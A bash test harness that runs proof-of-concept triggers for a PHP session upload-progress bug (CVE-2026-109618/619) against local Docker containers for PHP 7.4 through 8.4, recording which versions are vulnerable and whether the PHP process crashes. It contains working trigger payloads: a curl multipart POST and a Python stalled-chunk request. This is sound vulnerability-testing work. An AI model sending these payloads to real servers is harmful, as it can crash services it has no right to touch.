#!/usr/bin/env bash
# ─────────────────────────────────────────────────────────────────────────────
# test_matrix.sh — CVE-2026-109618/619 multi-version Docker test harness
#
# Spins up ephemeral PHP containers for each major version, runs:
#   1. check_vuln.sh   (version-based vulnerability assessment)
#   2. Trigger test    (actual PoC payload via PHP built-in server)
#
# Usage:  bash test_matrix.sh
# Requires: Docker
# ─────────────────────────────────────────────────────────────────────────────
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
REPORT_FILE="${SCRIPT_DIR}/test_report_$(date +%Y%m%d_%H%M%S).txt"
CHECK_SCRIPT="${SCRIPT_DIR}/check_vuln.sh"

PHP_VERSIONS=(
  "7.4"
  "8.0"
  "8.1"
  "8.2"
  "8.3"
  "8.4"
)

RED='\033[0;31m'; YEL='\033[1;33m'; GRN='\033[0;32m'; CYA='\033[0;36m'; RST='\033[0m'

BASE_PORT=19260

log() { echo -e "$1" | tee -a "$REPORT_FILE"; }

separator() {
  log "${CYA}════════════════════════════════════════════════════════════════════${RST}"
}

separator
log "${CYA}  CVE-2026-109618/619 — Multi-Version Docker Test Matrix${RST}"
log "${CYA}  $(date -u '+%Y-%m-%d %H:%M:%S UTC')${RST}"
log "${CYA}  Host: $(hostname) / $(uname -srm)${RST}"
separator
log ""

declare -a RESULTS_VERSION=()
declare -a RESULTS_VULN_STATUS=()
declare -a RESULTS_UPLOAD_PROGRESS=()
declare -a RESULTS_TRIGGER_PRIMARY=()
declare -a RESULTS_TRIGGER_FALLBACK=()
declare -a RESULTS_SESSION_CREATED=()
declare -a RESULTS_PROCESS_CRASH=()

idx=0
for PHP_VER in "${PHP_VERSIONS[@]}"; do
  PORT=$((BASE_PORT + idx))
  CONTAINER_NAME="php-up-test-${PHP_VER//\./-}"
  IMAGE="php:${PHP_VER}-cli"

  separator
  log "${CYA}  Testing PHP ${PHP_VER}  (image: ${IMAGE}, port: ${PORT})${RST}"
  separator

  log "[*] Pulling ${IMAGE}..."
  if ! docker pull "${IMAGE}" 2>&1 | tail -1 | tee -a "$REPORT_FILE"; then
    log "${RED}[!] Failed to pull ${IMAGE} — skipping${RST}"
    RESULTS_VERSION+=("$PHP_VER")
    RESULTS_VULN_STATUS+=("PULL_FAILED")
    RESULTS_UPLOAD_PROGRESS+=("-")
    RESULTS_TRIGGER_PRIMARY+=("-")
    RESULTS_TRIGGER_FALLBACK+=("-")
    RESULTS_SESSION_CREATED+=("-")
    RESULTS_PROCESS_CRASH+=("-")
    ((idx++)) || true
    continue
  fi

  docker rm -f "${CONTAINER_NAME}" 2>/dev/null || true

  # ── Phase 1: Version-based vulnerability check ──────────────────────
  log ""
  log "${CYA}── Phase 1: Version-based vulnerability check ──${RST}"

  VULN_OUTPUT=$(docker run --rm --name "${CONTAINER_NAME}-check" \
    -v "${CHECK_SCRIPT}:/check_vuln.sh:ro" \
    "${IMAGE}" bash /check_vuln.sh 2>&1) || true
  echo "$VULN_OUTPUT" | tee -a "$REPORT_FILE"

  if echo "$VULN_OUTPUT" | grep -q "VULNERABILE"; then
    VULN_STATUS="VULNERABLE"
  elif echo "$VULN_OUTPUT" | grep -q "MITIGATO"; then
    VULN_STATUS="MITIGATED"
  elif echo "$VULN_OUTPUT" | grep -q "PATCHATO"; then
    VULN_STATUS="PATCHED"
  else
    VULN_STATUS="UNKNOWN"
  fi

  UP_STATUS=$(echo "$VULN_OUTPUT" | grep "upload_progress.enabled" | head -1 | awk -F= '{print $2}' | xargs)
  [[ -z "$UP_STATUS" ]] && UP_STATUS="?"

  RESULTS_VERSION+=("$PHP_VER")
  RESULTS_VULN_STATUS+=("$VULN_STATUS")
  RESULTS_UPLOAD_PROGRESS+=("$UP_STATUS")

  # ── Phase 2: Live trigger test ──────────────────────────────────────
  log ""
  log "${CYA}── Phase 2: Live trigger test ──${RST}"

  TMPDIR_HOST=$(mktemp -d)
  cat > "${TMPDIR_HOST}/index.php" <<'PHPEOF'
<?php
session_start();
echo "OK php=" . PHP_VERSION . " sapi=" . php_sapi_name();
PHPEOF

  cat > "${TMPDIR_HOST}/php-test.ini" <<'INIEOF'
session.upload_progress.enabled = 0
session.upload_progress.cleanup = 0
session.upload_progress.prefix = upload_progress_
session.upload_progress.name = PHP_SESSION_UPLOAD_PROGRESS
session.upload_progress.freq = 1%
session.upload_progress.min_freq = 0
session.save_path = /tmp/sessions
session.save_handler = files
INIEOF

  cat > "${TMPDIR_HOST}/info.php" <<'PHPEOF'
<?php
echo "upload_progress.enabled=" . ini_get('session.upload_progress.enabled') . "\n";
echo "upload_progress.min_freq=" . ini_get('session.upload_progress.min_freq') . "\n";
echo "upload_progress.freq=" . ini_get('session.upload_progress.freq') . "\n";
echo "session.save_path=" . ini_get('session.save_path') . "\n";
PHPEOF

  docker run -d --rm \
    --name "${CONTAINER_NAME}" \
    -p "${PORT}:8080" \
    -v "${TMPDIR_HOST}:/app:rw" \
    "${IMAGE}" \
    bash -c "mkdir -p /tmp/sessions && chmod 777 /tmp/sessions && php -c /app/php-test.ini -S 0.0.0.0:8080 -t /app 2>&1" \
    > /dev/null 2>&1

  READY=0
  for i in $(seq 1 15); do
    if curl -s -o /dev/null -w "%{http_code}" "http://127.0.0.1:${PORT}/index.php" 2>/dev/null | grep -q "200"; then
      READY=1
      break
    fi
    sleep 0.5
  done

  if [[ $READY -eq 0 ]]; then
    log "${YEL}[!] PHP server did not start in time — skipping trigger test${RST}"
    RESULTS_TRIGGER_PRIMARY+=("SERVER_FAIL")
    RESULTS_TRIGGER_FALLBACK+=("-")
    RESULTS_SESSION_CREATED+=("-")
    RESULTS_PROCESS_CRASH+=("-")
    docker rm -f "${CONTAINER_NAME}" 2>/dev/null || true
    rm -rf "${TMPDIR_HOST}"
    ((idx++)) || true
    continue
  fi

  UP_CHECK=$(curl -s "http://127.0.0.1:${PORT}/index.php" 2>/dev/null)
  log "[*] Server response: ${UP_CHECK}"

  INI_CHECK=$(curl -s "http://127.0.0.1:${PORT}/info.php" 2>/dev/null)
  log "[*] Runtime config: $(echo "$INI_CHECK" | tr '\n' ' ')"

  # ── Primary trigger (single-shot POST) ────────────────────────────────
  log "[*] Sending PRIMARY trigger (single-shot POST)..."

  SID="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"

  HTTP_CODE_PRIMARY=$(curl -s -o "${TMPDIR_HOST}/resp_primary.txt" -w "%{http_code}" \
    -X POST \
    -H "Content-Type: multipart/form-data; boundary=----b" \
    -H "Cookie: PHPSESSID=${SID}" \
    -F "PHPSESSID=${SID}" \
    -F "PHP_SESSION_UPLOAD_PROGRESS=x" \
    -F "f=@/dev/null;filename=a" \
    --max-time 10 \
    "http://127.0.0.1:${PORT}/index.php" 2>/dev/null) || HTTP_CODE_PRIMARY="CONN_ERR"

  PRIMARY_RESP=$(cat "${TMPDIR_HOST}/resp_primary.txt" 2>/dev/null || echo "")
  log "[*] Primary trigger: HTTP ${HTTP_CODE_PRIMARY} — response: ${PRIMARY_RESP:0:120}"

  sleep 1
  ALIVE_AFTER_PRIMARY=1
  if ! curl -s -o /dev/null -w "%{http_code}" "http://127.0.0.1:${PORT}/index.php" 2>/dev/null | grep -q "200"; then
    ALIVE_AFTER_PRIMARY=0
    log "${RED}[!] PHP process CRASHED after primary trigger!${RST}"
  fi

  SESSION_FILES=$(docker exec "${CONTAINER_NAME}" ls -la /tmp/sessions/ 2>/dev/null || echo "EXEC_FAIL")
  SESSION_CREATED="no"
  if echo "$SESSION_FILES" | grep -q "sess_"; then
    SESSION_CREATED="yes"
    log "${YEL}[+] Session file created — upload_progress path was reached${RST}"
    SESS_CONTENT=$(docker exec "${CONTAINER_NAME}" cat "/tmp/sessions/sess_${SID}" 2>/dev/null || echo "(unreadable)")
    log "[*] Session content: ${SESS_CONTENT:0:300}"
  else
    log "[*] No session file (path may not have been reached)"
  fi

  RESULTS_TRIGGER_PRIMARY+=("HTTP_${HTTP_CODE_PRIMARY}")
  RESULTS_SESSION_CREATED+=("$SESSION_CREATED")

  # ── Fallback trigger (stall >1s between chunks) ──────────────────────
  log ""
  log "[*] Sending FALLBACK trigger (stall 1.5s between chunks)..."

  FALLBACK_RESULT=$(python3 -I -c "
import socket, time

PORT = ${PORT}
SID = b'a' * 32
BOUNDARY = b'----b'

body_start = (
    b'--' + BOUNDARY + b'\r\n'
    b'Content-Disposition: form-data; name=\"PHPSESSID\"\r\n\r\n'
    + SID + b'\r\n'
    b'--' + BOUNDARY + b'\r\n'
    b'Content-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\n'
    b'x\r\n'
    b'--' + BOUNDARY + b'\r\n'
    b'Content-Disposition: form-data; name=\"f\"; filename=\"a\"\r\n\r\n'
)
file_chunk1 = b'A' * 5184
file_chunk2 = b'B' * 5184
closing = b'\r\n--' + BOUNDARY + b'--\r\n'

full_body = body_start + file_chunk1 + file_chunk2 + closing
split_at = len(body_start) + len(file_chunk1)

head = (
    b'POST /index.php HTTP/1.1\r\n'
    b'Host: 127.0.0.1\r\n'
    b'Content-Type: multipart/form-data; boundary=' + BOUNDARY + b'\r\n'
    b'Content-Length: ' + str(len(full_body)).encode() + b'\r\n'
    b'Cookie: PHPSESSID=' + SID + b'\r\n'
    b'Connection: close\r\n'
    b'\r\n'
)

try:
    s = socket.create_connection(('127.0.0.1', PORT), timeout=10)
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    s.sendall(head + full_body[:split_at])
    time.sleep(1.5)
    s.sendall(full_body[split_at:])
    s.settimeout(8)
    resp = b''
    while True:
        try:
            d = s.recv(4096)
            if not d: break
            resp += d
        except socket.timeout: break
    s.close()
    status_line = resp.split(b'\r\n', 1)[0].decode('latin1', 'replace') if resp else 'NO-RESPONSE'
    print(f'STATUS:{status_line}')
    body_resp = resp.split(b'\r\n\r\n', 1)[-1] if b'\r\n\r\n' in resp else resp
    print(f'BODY:{body_resp[:200].decode(\"latin1\", \"replace\")}')
except Exception as e:
    print(f'ERROR:{e}')
" 2>&1) || FALLBACK_RESULT="PYTHON_ERR"

  log "[*] Fallback result: $(echo "$FALLBACK_RESULT" | head -3)"

  FALLBACK_STATUS=$(echo "$FALLBACK_RESULT" | grep "^STATUS:" | head -1 | sed 's/^STATUS://')
  [[ -z "$FALLBACK_STATUS" ]] && FALLBACK_STATUS="ERROR"
  RESULTS_TRIGGER_FALLBACK+=("$FALLBACK_STATUS")

  sleep 1
  ALIVE_AFTER_FALLBACK=1
  if ! curl -s -o /dev/null -w "%{http_code}" "http://127.0.0.1:${PORT}/index.php" 2>/dev/null | grep -q "200"; then
    ALIVE_AFTER_FALLBACK=0
    log "${RED}[!] PHP process CRASHED after fallback trigger!${RST}"
  fi

  SESSION_FILES_AFTER=$(docker exec "${CONTAINER_NAME}" ls -la /tmp/sessions/ 2>/dev/null || echo "EXEC_FAIL")
  if echo "$SESSION_FILES_AFTER" | grep -q "sess_"; then
    SESS_CONTENT_AFTER=$(docker exec "${CONTAINER_NAME}" cat "/tmp/sessions/sess_${SID}" 2>/dev/null || echo "(unreadable)")
    log "[*] Session after fallback: ${SESS_CONTENT_AFTER:0:300}"
    if echo "$SESS_CONTENT_AFTER" | grep -q "upload_progress"; then
      log "${YEL}[+] upload_progress data found in session — vulnerable code path confirmed${RST}"
    fi
  fi

  if [[ $ALIVE_AFTER_PRIMARY -eq 0 || $ALIVE_AFTER_FALLBACK -eq 0 ]]; then
    RESULTS_PROCESS_CRASH+=("CRASHED")
  else
    RESULTS_PROCESS_CRASH+=("survived")
  fi

  docker rm -f "${CONTAINER_NAME}" 2>/dev/null || true
  rm -rf "${TMPDIR_HOST}"

  log ""
  ((idx++)) || true
done

# ── Summary Report ──────────────────────────────────────────────────────
log ""
separator
log "${CYA}  SUMMARY REPORT — CVE-2026-109618/619 Multi-Version Test${RST}"
separator
log ""
log "$(printf '%-8s %-14s %-10s %-14s %-22s %-10s %-10s' \
  'PHP' 'VULN_STATUS' 'UP_ENABL' 'PRIMARY' 'FALLBACK' 'SESS_FILE' 'CRASH')"
log "$(printf '%-8s %-14s %-10s %-14s %-22s %-10s %-10s' \
  '-------' '-------------' '---------' '-------------' '---------------------' '---------' '---------')"

for i in "${!RESULTS_VERSION[@]}"; do
  STATUS_COLOR=""
  case "${RESULTS_VULN_STATUS[$i]}" in
    VULNERABLE) STATUS_COLOR="${RED}" ;;
    PATCHED)    STATUS_COLOR="${GRN}" ;;
    MITIGATED)  STATUS_COLOR="${YEL}" ;;
    *)          STATUS_COLOR="${YEL}" ;;
  esac
  CRASH_COLOR=""
  [[ "${RESULTS_PROCESS_CRASH[$i]}" == "CRASHED" ]] && CRASH_COLOR="${RED}"

  log "$(printf '%-8s ' "${RESULTS_VERSION[$i]}")${STATUS_COLOR}$(printf '%-14s' "${RESULTS_VULN_STATUS[$i]}")${RST}$(printf ' %-10s %-14s %-22s %-10s ' \
    "${RESULTS_UPLOAD_PROGRESS[$i]}" \
    "${RESULTS_TRIGGER_PRIMARY[$i]}" \
    "${RESULTS_TRIGGER_FALLBACK[$i]}" \
    "${RESULTS_SESSION_CREATED[$i]}")${CRASH_COLOR}$(printf '%-10s' "${RESULTS_PROCESS_CRASH[$i]}")${RST}"
done

log ""
separator
log "${CYA}  Legend:${RST}"
log "  VULN_STATUS : version-based assessment (VULNERABLE/PATCHED/MITIGATED)"
log "  UP_ENABL    : session.upload_progress.enabled default value"
log "  PRIMARY     : HTTP response to single-shot PoC POST"
log "  FALLBACK    : HTTP response to stall-based (>min_freq) PoC"
log "  SESS_FILE   : session file created (vulnerable path reached)"
log "  CRASH       : PHP process crashed after trigger"
log ""
log "  Report saved to: ${REPORT_FILE}"
separator
